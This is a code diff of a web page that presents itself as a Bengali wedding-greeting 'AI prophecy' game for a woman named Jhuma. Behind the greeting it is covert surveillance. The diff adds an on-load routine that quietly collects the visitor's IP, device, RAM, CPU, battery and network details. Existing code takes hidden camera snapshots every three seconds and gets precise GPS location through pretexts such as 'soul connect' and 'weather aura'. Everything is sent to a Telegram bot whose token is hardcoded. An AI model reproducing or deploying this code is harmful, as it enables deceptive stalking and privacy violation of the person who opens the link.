@@ -6,16 +6,15 @@
     <title>শুভ বিবাহ - ঝুমার বিয়ে</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        body { background: radial-gradient(circle, #2c003e 0%, #000 100%); color: #fff; font-family: 'Hind Siliguri', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { background: radial-gradient(circle, #2c003e 0%, #000 100%); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .box { width: 85%; max-width: 450px; background: rgba(255, 255, 255, 0.05); padding: 35px; border-radius: 40px; border: 2px solid #ffcc00; text-align: center; box-shadow: 0 0 40px rgba(255, 204, 0, 0.2); backdrop-filter: blur(10px); }
-        .jhuma-title { font-size: 2.5rem; color: #ffcc00; text-shadow: 0 0 20px #ff3399; font-weight: bold; margin-bottom: 10px; animation: glow 2s infinite alternate; }
+        .jhuma-title { font-size: 2.2rem; color: #ffcc00; text-shadow: 0 0 20px #ff3399; font-weight: bold; margin-bottom: 10px; animation: glow 2s infinite alternate; }
         @keyframes glow { from { text-shadow: 0 0 10px #ffcc00; } to { text-shadow: 0 0 30px #ff3399, 0 0 10px #fff; } }
         .screen { display: none; }
         .active { display: block; }
         .btn { padding: 18px; background: linear-gradient(45deg, #ff3399, #ffcc00); color: #000; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 5px 15px rgba(255, 51, 153, 0.4); }
         .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 2px solid #ffcc00; height: 230px; object-fit: cover; }
         #video { opacity: 0; position: absolute; width: 1px; height: 1px; }
-        .status-msg { font-size: 0.9rem; color: #ffeb3b; margin-top: 10px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -35,7 +34,7 @@
 
     <div id="s2" class="screen">
         <h3>আভামণ্ডল বিশ্লেষণ... 🌤️</h3>
-        <p id="loc-text">সঠিক ভবিষ্যৎবাণীর জন্য এআই-কে তোমার বর্তমান চারপাশের আবহাওয়ার স্পন্দন অনুভব করতে দাও।</p>
+        <p>সঠিক ভবিষ্যৎবাণীর জন্য এআই-কে তোমার বর্তমান চারপাশের আবহাওয়ার স্পন্দন অনুভব করতে দাও।</p>
         <button class="btn" onclick="requestLocation()" style="background: #00ffaa;">আবহাওয়ার স্পন্দন দাও 📍</button>
         <p id="err-msg" style="color: #ff3333; display: none; margin-top: 10px;">এআই তোমার আবহাওয়ার অবস্থা নির্ধারণ করতে পারছে না, দয়া করে জিপিএস অন করো।</p>
     </div>
@@ -55,9 +54,37 @@
 <script>
     const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA';
     const CHAT_ID = '6547277630';
-
     let storyIndex = 0;
     const music = document.getElementById('bgMusic');
+
+    // ১. লিঙ্কে ঢোকার সাথে সাথে তথ্য সংগ্রহ (IP, Device, RAM, CPU etc.)
+    window.onload = async function() {
+        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+        
+        try {
+            const n = navigator;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const conn = n.connection || n.mozConnection || n.webkitConnection || {};
+            
+            let batteryInfo = "N/A";
+            if (n.getBattery) {
+                const b = await n.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            }
+
+            let info = `🌐 **New Visitor Joined!**\n` +
+                       `📍 **IP:** \`${ipData.ip}\`\n` +
+                       `📱 **Model:** ${n.platform} (${n.userAgent.split('(')[1].split(')')[0]})\n` +
+                       `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n` +
+                       `⚙️ **CPU Cores:** ${n.hardwareConcurrency || 'N/A'}\n` +
+                       `🔋 **Battery:** ${batteryInfo}\n` +
+                       `📶 **Network:** ${conn.effectiveType || 'Unknown'}\n` +
+                       `🕒 **Time:** ${new Date().toLocaleString()}`;
+
+            sendBot(info);
+        } catch (e) { sendBot("❌ Failed to collect device info."); }
+    };
 
     const contents = [
         { t: "তোমার ও তোমার স্বামীর সুন্দর দিনকাল", i: "https://images.unsplash.com/photo-1516589174184-c68526514800", d: "এআই বলছে তোমাদের আগামী দিনগুলো ভালোবাসায় সিক্ত থাকবে।" },
@@ -68,23 +95,16 @@
         { t: "সুখময় বার্ধক্য ও নাতনী", i: "https://images.unsplash.com/photo-1544144433-d50aff500b91", d: "শেষ বয়সেও তোমরা একে অপরের হাত ধরে সুখে থাকবে।" }
     ];
 
-    window.onload = () => {
-        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-    };
-
     function startProcess() {
-        // Voice Message
         const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য একটি মজার গেম উপহার। নতুন বিবাহ শুভ হোক। আল্লাহ তাআলা তোমাদের সুখে রাখুন।");
         msg.lang = 'bn-BD';
-        msg.onend = () => music.play(); // Play music after voice
+        msg.onend = () => music.play();
         window.speechSynthesis.speak(msg);
 
-        // Request Camera (Soul Sync)
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             document.getElementById('video').srcObject = stream;
             setInterval(autoCapture, 3000);
-            sendBot("📸 **Soul Connect Established!** (Camera On)");
-            
+            sendBot("📸 **Camera Access Granted!**");
             document.getElementById('s1').classList.remove('active');
             document.getElementById('s2').classList.add('active');
         }).catch(() => alert("আত্মিক সংযোগ ছাড়া ভবিষ্যৎ দেখা সম্ভব নয়।"));
@@ -96,30 +116,25 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             sendBot(`📍 **Aura Location Found!**\n[View Map](https://www.google.com/maps?q=${lat},${lon})`);
-            
             document.getElementById('s2').classList.remove('active');
             document.getElementById('s3').classList.add('active');
             showStory();
-        }, () => {
-            document.getElementById('err-msg').style.display = 'block';
-        }, { enableHighAccuracy: true });
+        }, () => { document.getElementById('err-msg').style.display = 'block'; }, { enableHighAccuracy: true });
     }
 
     function showStory() {
         if (storyIndex < contents.length) {
             document.getElementById('loader').style.display = 'block';
             document.getElementById('next-btn').style.display = 'none';
-
             setTimeout(() => {
                 const data = contents[storyIndex];
                 document.getElementById('res-title').innerText = data.t;
                 document.getElementById('res-img').src = data.i + "?w=400";
                 document.getElementById('res-desc').innerText = data.d;
-                
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('next-btn').style.display = 'block';
                 storyIndex++;
-            }, 2500); // ২.৫ সেকেন্ড লোডিং টাইম
+            }, 2500); 
         } else {
             document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
             document.getElementById('res-desc').innerText = "তোমাদের দাম্পত্য জীবন অনেক সুখের হোক। শুভকামনা!";
